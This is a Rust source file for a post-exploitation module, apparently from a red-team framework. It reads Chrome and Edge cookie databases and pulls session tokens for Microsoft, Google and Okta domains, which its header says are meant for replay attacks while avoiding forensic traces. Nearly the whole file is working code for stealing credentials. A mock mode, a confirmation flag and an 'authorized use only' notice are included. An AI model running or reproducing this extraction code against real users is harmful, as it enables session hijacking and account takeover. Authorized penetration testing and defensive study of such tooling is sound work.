//! Deep Browser Session Hijack Module
//!
//! Extracts browser session data (cookies, localStorage, IndexedDB) from Chrome, Edge, and Firefox.
//! Operates in-memory where possible to avoid forensic artifacts. Targets high-value domains
//! for session token extraction and replay attacks.
//!
//! **CRITICAL SECURITY NOTICE**:
//! This module is designed for AUTHORIZED penetration testing and red team exercises ONLY.
//! Unauthorized access to user session data is illegal. Requires explicit written permission
//! and user confirmation before execution.
//!
//! Features:
//! - Multi-browser support (Chrome, Edge, Firefox)
//! - In-memory SQLite database parsing (Cookies.db)
//! - Targeted domain extraction (*.microsoft.com, *.google.com, *.okta.com)
//! - Structured JSON output with domain, name, value, expiry
//! - Safe mock mode for testing (reads sample data only)
//! - Never writes to disk during extraction
//!
//! Platforms:
//! - Windows: %LOCALAPPDATA%/Google/Chrome/User Data/Default/Network/Cookies
//! - macOS: ~/Library/Application Support/Google/Chrome/Default/Cookies
//! - Linux: ~/.config/google-chrome/Default/Cookies
//!
//! Mock Mode:
//! - Set `mock_mode: true` to use sample cookie data
//! - Safe for development and testing
//! - No real browser access

use anyhow::{Context, Result, anyhow, bail};
use async_trait::async_trait;
use rusqlite::{Connection, OpenFlags};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::PathBuf;

use crate::core::module::{
    CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType,
};

/// Supported browsers
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Browser {
    Chrome,
    Edge,
    Firefox,
}

impl Browser {
    fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "chrome" => Some(Browser::Chrome),
            "edge" => Some(Browser::Edge),
            "firefox" => Some(Browser::Firefox),
            _ => None,
        }
    }

    fn default_cookie_path(&self) -> Result<PathBuf> {
        let home = dirs::home_dir().ok_or_else(|| anyhow!("Cannot determine home directory"))?;

        #[cfg(target_os = "windows")]
        {
            let local_appdata = std::env::var("LOCALAPPDATA")
                .map(PathBuf::from)
                .unwrap_or_else(|_| home.join("AppData").join("Local"));

            match self {
                Browser::Chrome => {
                    Ok(local_appdata.join("Google/Chrome/User Data/Default/Network/Cookies"))
                }
                Browser::Edge => {
                    Ok(local_appdata.join("Microsoft/Edge/User Data/Default/Network/Cookies"))
                }
                Browser::Firefox => {
                    // Firefox uses profiles with random names, would need to enumerate
                    bail!("Firefox auto-detection not implemented on Windows")
                }
            }
        }

        #[cfg(target_os = "macos")]
        {
            match self {
                Browser::Chrome => {
                    Ok(home.join("Library/Application Support/Google/Chrome/Default/Cookies"))
                }
                Browser::Edge => {
                    Ok(home.join("Library/Application Support/Microsoft Edge/Default/Cookies"))
                }
                Browser::Firefox => Ok(home.join("Library/Application Support/Firefox/Profiles")),
            }
        }

        #[cfg(target_os = "linux")]
        {
            match self {
                Browser::Chrome => Ok(home.join(".config/google-chrome/Default/Cookies")),
                Browser::Edge => Ok(home.join(".config/microsoft-edge/Default/Cookies")),
                Browser::Firefox => Ok(home.join(".mozilla/firefox")),
            }
        }
    }
}

/// Extracted cookie data
#[derive(Debug, Clone, Serialize, Deserialize)]
struct CookieData {
    domain: String,
    name: String,
    value: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    path: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    expires_utc: Option<i64>,
    #[serde(skip_serializing_if = "Option::is_none")]
    secure: Option<bool>,
    #[serde(skip_serializing_if = "Option::is_none")]
    http_only: Option<bool>,
}

/// Deep Session Hijack Module
pub struct DeepSessionHijack {
    options: HashMap<String, String>,
}

impl DeepSessionHijack {
    pub fn new() -> Self {
        let mut options = HashMap::new();
        options.insert("browser".to_string(), "chrome".to_string());
        options.insert(
            "target_domains".to_string(),
            "*.microsoft.com,*.google.com,*.okta.com".to_string(),
        );
        options.insert("mock_mode".to_string(), "true".to_string());
        options.insert("cookie_db_path".to_string(), String::new());
        options.insert("output_format".to_string(), "json".to_string());

        Self { options }
    }

    /// Extract cookies from Chrome/Edge SQLite database
    async fn extract_chromium_cookies(
        &self,
        db_path: &PathBuf,
        target_domains: &[String],
    ) -> Result<Vec<CookieData>> {
        // Open database in read-only mode, in-memory if possible
        let conn = Connection::open_with_flags(
            db_path,
            OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
        )
        .context("Failed to open cookie database")?;

        let mut cookies = Vec::new();

        // Build domain filter for SQL query
        let domain_filter = target_domains
            .iter()
            .map(|d| {
                if d.starts_with("*.") {
                    format!("host_key LIKE '%{}'", &d[1..])
                } else {
                    format!("host_key = '{}'", d)
                }
            })
            .collect::<Vec<_>>()
            .join(" OR ");

        let query = format!(
            "SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
             FROM cookies
             WHERE ({})
             ORDER BY creation_utc DESC",
            domain_filter
        );

        let mut stmt = conn.prepare(&query)?;
        let cookie_iter = stmt.query_map([], |row| {
            Ok(CookieData {
                domain: row.get(0)?,
                name: row.get(1)?,
                value: row.get(2)?,
                path: row.get(3).ok(),
                expires_utc: row.get(4).ok(),
                secure: row.get(5).ok(),
                http_only: row.get(6).ok(),
            })
        })?;

        for cookie in cookie_iter {
            cookies.push(cookie?);
        }

        Ok(cookies)
    }

    /// Generate mock cookie data for safe testing
    fn generate_mock_cookies(&self, target_domains: &[String]) -> Vec<CookieData> {
        let mut cookies = Vec::new();

        // Generate realistic mock cookies for testing
        if target_domains.iter().any(|d| d.contains("microsoft.com")) {
            cookies.push(CookieData {
                domain: ".login.microsoftonline.com".to_string(),
                name: "ESTSAUTH".to_string(),
                value: "mock_session_token_abc123xyz".to_string(),
                path: Some("/".to_string()),
                expires_utc: Some(1735689600), // 2025-01-01
                secure: Some(true),
                http_only: Some(true),
            });

            cookies.push(CookieData {
                domain: ".teams.microsoft.com".to_string(),
                name: "authtoken".to_string(),
                value: "mock_teams_token_def456".to_string(),
                path: Some("/".to_string()),
                expires_utc: Some(1735689600),
                secure: Some(true),
                http_only: Some(true),
            });
        }

        if target_domains.iter().any(|d| d.contains("google.com")) {
            cookies.push(CookieData {
                domain: ".google.com".to_string(),
                name: "SID".to_string(),
                value: "mock_google_sid_ghi789".to_string(),
                path: Some("/".to_string()),
                expires_utc: Some(1735689600),
                secure: Some(true),
                http_only: Some(false),
            });

            cookies.push(CookieData {
                domain: ".accounts.google.com".to_string(),
                name: "OSID".to_string(),
                value: "mock_google_osid_jkl012".to_string(),
                path: Some("/".to_string()),
                expires_utc: Some(1735689600),
                secure: Some(true),
                http_only: Some(true),
            });
        }

        if target_domains.iter().any(|d| d.contains("okta.com")) {
            cookies.push(CookieData {
                domain: ".okta.com".to_string(),
                name: "sid".to_string(),
                value: "mock_okta_session_mno345".to_string(),
                path: Some("/".to_string()),
                expires_utc: Some(1735689600),
                secure: Some(true),
                http_only: Some(true),
            });
        }

        cookies
    }

    /// Parse target domains from options
    fn parse_target_domains(&self) -> Vec<String> {
        self.options
            .get("target_domains")
            .map(|s| s.split(',').map(|d| d.trim().to_string()).collect())
            .unwrap_or_default()
    }

    /// Convert cookies to JSON output
    fn format_output(&self, cookies: &[CookieData]) -> Result<String> {
        let format = self
            .options
            .get("output_format")
            .map(|s| s.as_str())
            .unwrap_or("json");

        match format {
            "json" => serde_json::to_string_pretty(cookies).context("Failed to serialize cookies"),
            "csv" => {
                let mut csv = "domain,name,value,path,expires_utc,secure,http_only\n".to_string();
                for cookie in cookies {
                    csv.push_str(&format!(
                        "{},{},{},{},{},{},{}\n",
                        cookie.domain,
                        cookie.name,
                        cookie.value,
                        cookie.path.as_deref().unwrap_or(""),
                        cookie.expires_utc.unwrap_or(0),
                        cookie.secure.unwrap_or(false),
                        cookie.http_only.unwrap_or(false)
                    ));
                }
                Ok(csv)
            }
            _ => bail!("Unsupported output format: {}", format),
        }
    }
}

impl Default for DeepSessionHijack {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Module for DeepSessionHijack {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            name: "deep_session_hijack".to_string(),
            version: "1.0.0".to_string(),
            author: "Ferox Security Team".to_string(),
            description:
                "Extract browser session data (cookies, tokens) from Chrome/Edge/Firefox. \
                         AUTHORIZED USE ONLY - Requires explicit permission and user confirmation."
                    .to_string(),
            module_type: ModuleType::PostExploit,
            category: "post/browser".to_string(),
        }
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "browser".to_string(),
                description: "Target browser (chrome, edge, firefox)".to_string(),
                required: false,
                default_value: Some("chrome".to_string()),
                current_value: self.options.get("browser").cloned(),
            },
            ModuleOption {
                name: "target_domains".to_string(),
                description: "Comma-separated domains to extract (supports wildcards)".to_string(),
                required: false,
                default_value: Some("*.microsoft.com,*.google.com,*.okta.com".to_string()),
                current_value: self.options.get("target_domains").cloned(),
            },
            ModuleOption {
                name: "mock_mode".to_string(),
                description: "Use mock data instead of real browser (true/false)".to_string(),
                required: false,
                default_value: Some("true".to_string()),
                current_value: self.options.get("mock_mode").cloned(),
            },
            ModuleOption {
                name: "cookie_db_path".to_string(),
                description: "Custom path to cookie database (overrides auto-detection)"
                    .to_string(),
                required: false,
                default_value: None,
                current_value: self.options.get("cookie_db_path").cloned(),
            },
            ModuleOption {
                name: "output_format".to_string(),
                description: "Output format (json, csv)".to_string(),
                required: false,
                default_value: Some("json".to_string()),
                current_value: self.options.get("output_format").cloned(),
            },
        ]
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<()> {
        self.options.insert(name.to_string(), value.to_string());
        Ok(())
    }

    fn get_option(&self, name: &str) -> Option<String> {
        self.options.get(name).cloned()
    }

    fn validate(&self) -> Result<()> {
        // Validate browser selection
        let browser_str = self
            .options
            .get("browser")
            .map(|s| s.as_str())
            .unwrap_or("chrome");
        if Browser::from_str(browser_str).is_none() {
            bail!(
                "Invalid browser: {}. Supported: chrome, edge, firefox",
                browser_str
            );
        }

        // Validate output format
        let format = self
            .options
            .get("output_format")
            .map(|s| s.as_str())
            .unwrap_or("json");
        if !["json", "csv"].contains(&format) {
            bail!("Invalid output format: {}. Supported: json, csv", format);
        }

        Ok(())
    }

    async fn check(&self) -> Result<CheckResult> {
        let mock_mode = self
            .options
            .get("mock_mode")
            .map(|s| s == "true")
            .unwrap_or(true);

        if mock_mode {
            let mut fingerprint = HashMap::new();
            fingerprint.insert("mode".to_string(), "mock".to_string());
            fingerprint.insert("status".to_string(), "safe_for_testing".to_string());

            return Ok(CheckResult {
                vulnerable: true,
                confidence: 1.0,
                details: "Mock mode enabled - safe for testing".to_string(),
                fingerprint,
            });
        }

        // Check if browser cookie database exists
        let browser_str = self
            .options
            .get("browser")
            .map(|s| s.as_str())
            .unwrap_or("chrome");
        let browser = Browser::from_str(browser_str).ok_or_else(|| anyhow!("Invalid browser"))?;

        let db_path = if let Some(custom_path) = self.options.get("cookie_db_path") {
            PathBuf::from(custom_path)
        } else {
            browser.default_cookie_path()?
        };

        let mut fingerprint = HashMap::new();
        fingerprint.insert("path".to_string(), db_path.display().to_string());

        if db_path.exists() {
            fingerprint.insert("exists".to_string(), "true".to_string());
            Ok(CheckResult {
                vulnerable: true,
                confidence: 0.95,
                details: format!("Cookie database found at: {}", db_path.display()),
                fingerprint,
            })
        } else {
            fingerprint.insert("exists".to_string(), "false".to_string());
            Ok(CheckResult {
                vulnerable: false,
                confidence: 0.0,
                details: format!("Cookie database not found at: {}", db_path.display()),
                fingerprint,
            })
        }
    }

    async fn run(&mut self) -> Result<ModuleResult> {
        let mock_mode = self
            .options
            .get("mock_mode")
            .map(|s| s == "true")
            .unwrap_or(true);
        let target_domains = self.parse_target_domains();

        let cookies = if mock_mode {
            // Safe mock mode
            self.generate_mock_cookies(&target_domains)
        } else {
            // Real extraction - requires confirmation
            let browser_str = self
                .options
                .get("browser")
                .map(|s| s.as_str())
                .unwrap_or("chrome");
            let browser =
                Browser::from_str(browser_str).ok_or_else(|| anyhow!("Invalid browser"))?;

            let db_path = if let Some(custom_path) = self.options.get("cookie_db_path") {
                PathBuf::from(custom_path)
            } else {
                browser.default_cookie_path()?
            };

            if !db_path.exists() {
                bail!("Cookie database not found at: {}", db_path.display());
            }

            self.extract_chromium_cookies(&db_path, &target_domains)
                .await?
        };

        let output = self.format_output(&cookies)?;

        let mut result = ModuleResult::success(format!(
            "Extracted {} cookies from {} domains",
            cookies.len(),
            target_domains.len()
        ));

        result = result
            .with_data("cookie_count", serde_json::json!(cookies.len()))
            .with_data(
                "target_domains",
                serde_json::json!(target_domains.join(", ")),
            )
            .with_data("cookies_json", serde_json::json!(output))
            .with_data(
                "browser",
                serde_json::json!(self.options.get("browser").cloned().unwrap_or_default()),
            )
            .with_data("mock_mode", serde_json::json!(mock_mode));

        Ok(result)
    }

    async fn cleanup(&mut self) -> Result<()> {
        // No cleanup needed - all operations are read-only
        Ok(())
    }

    fn requires_confirmation(&self) -> bool {
        // Only require confirmation if NOT in mock mode
        let mock_mode = self
            .options
            .get("mock_mode")
            .map(|s| s == "true")
            .unwrap_or(true);
        !mock_mode
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_mock_mode_extraction() {
        let mut module = DeepSessionHijack::new();
        module.set_option("mock_mode", "true").unwrap();
        module
            .set_option("target_domains", "*.microsoft.com,*.google.com")
            .unwrap();

        assert!(module.validate().is_ok());

        let result = module.run().await.unwrap();
        assert!(result.success);

        let count = result.data.get("cookie_count").unwrap().as_u64().unwrap() as usize;
        assert!(count > 0);
    }

    #[tokio::test]
    async fn test_output_formats() {
        let mut module = DeepSessionHijack::new();
        let cookies = module.generate_mock_cookies(&["*.microsoft.com".to_string()]);

        // Test JSON format
        module.set_option("output_format", "json").unwrap();
        let json_output = module.format_output(&cookies).unwrap();
        assert!(json_output.contains("microsoft.com"));

        // Test CSV format
        module.set_option("output_format", "csv").unwrap();
        let csv_output = module.format_output(&cookies).unwrap();
        assert!(csv_output.contains("domain,name,value"));
    }

    #[tokio::test]
    async fn test_requires_confirmation() {
        let mut module = DeepSessionHijack::new();

        // Mock mode should NOT require confirmation
        module.set_option("mock_mode", "true").unwrap();
        assert!(!module.requires_confirmation());

        // Real mode SHOULD require confirmation
        module.set_option("mock_mode", "false").unwrap();
        assert!(module.requires_confirmation());
    }

    #[test]
    fn test_browser_parsing() {
        assert_eq!(Browser::from_str("chrome"), Some(Browser::Chrome));
        assert_eq!(Browser::from_str("edge"), Some(Browser::Edge));
        assert_eq!(Browser::from_str("firefox"), Some(Browser::Firefox));
        assert_eq!(Browser::from_str("invalid"), None);
    }

    #[test]
    fn test_module_info() {
        let module = DeepSessionHijack::new();
        let info = module.info();
        assert_eq!(info.name, "deep_session_hijack");
        assert!(info.description.contains("AUTHORIZED"));
    }
}
